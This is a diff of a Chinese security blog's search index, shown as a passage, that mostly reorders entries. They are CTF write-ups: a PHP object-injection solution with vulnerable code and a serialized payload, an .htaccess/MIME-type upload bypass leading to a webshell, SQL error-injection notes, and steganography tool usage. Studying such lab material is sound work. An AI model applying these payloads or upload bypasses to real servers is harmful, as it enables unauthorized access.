@@ -441,6 +441,33 @@
       </tags>
   </entry>
   <entry>
+    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
+    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
+<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
+<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
+<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入bypass</title>
     <url>/2023/01/07/SQL%E6%B3%A8%E5%85%A5bypass/</url>
     <content><![CDATA[<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p>[<a href="https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE]">https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%201%201.%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%88%E6%B3%A8%E9%87%8A%E7%AC%A6%20%2F%2A%20%2A%2F%EF%BC%8C%25a0%20%EF%BC%89%EF%BC%9A%202%202.%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%9A,xor%20not%E7%BB%95%E8%BF%87%EF%BC%9A%207%207.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%20%28%E5%90%8E%E9%9D%A2%E8%B7%9F%E4%B8%80%E4%B8%AA%E7%A9%BA%E6%A0%BC%EF%BC%89%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A%208%208.%3D%E7%BB%95%E8%BF%87%EF%BC%9A%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE]</a>(<a href="https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7">https://www.cnblogs.com/Vinson404/p/7253255.html#:~:text=SQL注入绕过技巧</a> 1 1.绕过空格（注释符 %2F* *%2F，%a0 ）： 2 2.括号绕过空格：,xor not绕过： 7 7.绕过注释符号（%23，– (后面跟一个空格））过滤： 8 8.%3D绕过： 更多项目)</p>
@@ -488,27 +515,30 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
-    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
+    <title>(SWPUCTF 2021 新生赛)ez_unserialize</title>
+    <url>/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070605858-43f3f5c2-fbff-4677-90ac-0fe0d7781677.png" alt="img"></p>
 <span id="more"></span>
 
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
-<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
-<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
-<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
-<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
+<p>常规来看，找不到题目，找源码。</p>
+<p>源码不给提示。扫目录</p>
+<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070663737-8aabd0ac-c2ed-4735-93b2-4c0f52442e27.png" alt="img"></p>
+<p>robots.txt里面有不能访问的文件名</p>
+<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070709712-b23888e2-cc78-4328-9689-dd290d1caed2.png" alt="img"></p>
+<p>代码分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;                              //定义了一个wllm类</span><br><span class="line"></span><br><span class="line">    public $admin;                       //定义类属性admin</span><br><span class="line">    public $passwd;                      //定义类属性passwd</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;       //魔法方法中的__construct方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;            //定义wllm类中的admin属性值为user</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;        //定义wllm类中的passwd属性值为123456</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;     //魔法方法————dustruct，析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;  //当admin=admin，passwd=ctf时输出flag</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;                            //反之，输出admin、passwd以及just a bit more</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = $_GET[&#x27;p&#x27;];                           //用get方法接收参数p</span><br><span class="line">unserialize($p);                           //将参数p反序列化</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以解题的关键在于将p参数反序列化的内容序列化，一负一正得出flag</p>
+<p>所以构造序列化代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$aa=new wllm();             //aa为wllm的实例化对象</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;         //aa的admin属性值为admin</span><br><span class="line">$aa-&gt;passwd=&quot;ctf&quot;;          //aa的passwd属性值为ctf</span><br><span class="line">$s=serialize($aa);          //将aa序列化赋值给s</span><br><span class="line">print_r($s);                //输出s</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071554143-e61d21a7-14b5-4ab2-85e6-569c66349c5f.png" alt="img"></p>
+<p>payload</p>
+<p>?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p>
+<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071604351-3ab66640-83a3-47fa-865a-52fdc266fd8a.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>SQL注入</category>
+        <category>反序列化</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -594,36 +624,6 @@
       </categories>
       <tags>
         <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(SWPUCTF 2021 新生赛)ez_unserialize</title>
-    <url>/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070605858-43f3f5c2-fbff-4677-90ac-0fe0d7781677.png" alt="img"></p>
-<span id="more"></span>
-
-<p>常规来看，找不到题目，找源码。</p>
-<p>源码不给提示。扫目录</p>
-<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070663737-8aabd0ac-c2ed-4735-93b2-4c0f52442e27.png" alt="img"></p>
-<p>robots.txt里面有不能访问的文件名</p>
-<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671070709712-b23888e2-cc78-4328-9689-dd290d1caed2.png" alt="img"></p>
-<p>代码分析</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;                              //定义了一个wllm类</span><br><span class="line"></span><br><span class="line">    public $admin;                       //定义类属性admin</span><br><span class="line">    public $passwd;                      //定义类属性passwd</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;       //魔法方法中的__construct方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;            //定义wllm类中的admin属性值为user</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;        //定义wllm类中的passwd属性值为123456</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;     //魔法方法————dustruct，析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;  //当admin=admin，passwd=ctf时输出flag</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;                            //反之，输出admin、passwd以及just a bit more</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = $_GET[&#x27;p&#x27;];                           //用get方法接收参数p</span><br><span class="line">unserialize($p);                           //将参数p反序列化</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>所以解题的关键在于将p参数反序列化的内容序列化，一负一正得出flag</p>
-<p>所以构造序列化代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$aa=new wllm();             //aa为wllm的实例化对象</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;         //aa的admin属性值为admin</span><br><span class="line">$aa-&gt;passwd=&quot;ctf&quot;;          //aa的passwd属性值为ctf</span><br><span class="line">$s=serialize($aa);          //将aa序列化赋值给s</span><br><span class="line">print_r($s);                //输出s</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071554143-e61d21a7-14b5-4ab2-85e6-569c66349c5f.png" alt="img"></p>
-<p>payload</p>
-<p>?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p>
-<p><img src="/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/1671071604351-3ab66640-83a3-47fa-865a-52fdc266fd8a.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -787,40 +787,6 @@
       </tags>
   </entry>
   <entry>
-    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
-    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
-<p>1.上传php文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
-<p>可见有后缀名过滤</p>
-<p>2.上传jpg文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
-<p>可见对文件内容为&lt;?可能有过滤</p>
-<p>3.上传.htaccess文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
-<p>经过分析，是mime类型过滤</p>
-<p>将mime类型改为image/jpeg即可</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
-<p>AddType application/x-httpd-php .jpg</p>
-<p>这句话的意思是将jpg文件后缀解析为php文件</p>
-<p>4.传🐎</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
-<p>5.getshell</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(load_file&amp;into outfile)云演sql注入基础</title>
     <url>/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807114141-123d5599-d2ce-4598-afc6-018fd82e76ef.png" alt="img"></p>
@@ -857,6 +823,40 @@
       </tags>
   </entry>
   <entry>
+    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
+    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
+<p>1.上传php文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
+<p>可见有后缀名过滤</p>
+<p>2.上传jpg文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
+<p>可见对文件内容为&lt;?可能有过滤</p>
+<p>3.上传.htaccess文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
+<p>经过分析，是mime类型过滤</p>
+<p>将mime类型改为image/jpeg即可</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
+<p>AddType application/x-httpd-php .jpg</p>
+<p>这句话的意思是将jpg文件后缀解析为php文件</p>
+<p>4.传🐎</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
+<p>5.getshell</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>mp3stego怎么用</title>
     <url>/2023/01/07/mp3stego%E6%80%8E%E4%B9%88%E7%94%A8/</url>
     <content><![CDATA[<ul>
@@ -886,6 +886,29 @@
 </ul>
 </li>
 </ul>
+]]></content>
+      <categories>
+        <category>ctf工具</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>outguess图片隐写工具安装使用</title>
+    <url>/2023/01/07/outguess%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>outguess下载安装</p>
+<p>kail 终端命令输入git clone <a href="https://github.com/crorvick/outguess%EF%BC%8C%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%88%B0%E6%96%87%E4%BB%B6%E5%A4%B9%E3%80%82%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%8F%B3%E9%94%AE%E7%A9%BA%E7%99%BD%E5%A4%84%E9%80%89%E7%BB%88%E7%AB%AF%E6%89%93%E5%BC%80%EF%BC%8C%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4./configure">https://github.com/crorvick/outguess，安装包下载完成到文件夹。打开文件夹，右键空白处选终端打开，输入命令./configure</a> &amp;&amp; make &amp;&amp; make install进行安装。</p>
+<span id="more"></span>
+
+<p>使用outguess</p>
+<p>输入outguess -help即可获得相关命令。</p>
+<p>加密：</p>
+<p>outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</p>
+<p>加密之后，demo.jpg会覆盖out.jpg，hidden.txt的内容是要隐藏的东西。</p>
+<p>解密：</p>
+<p>outguess -k “my secret key” -r out.jpg hidden.txt</p>
+<p>解密之后，紧密内容放在hidden.txt中</p>
 ]]></content>
       <categories>
         <category>ctf工具</category>
@@ -939,60 +962,6 @@
       </tags>
   </entry>
   <entry>
-    <title>outguess图片隐写工具安装使用</title>
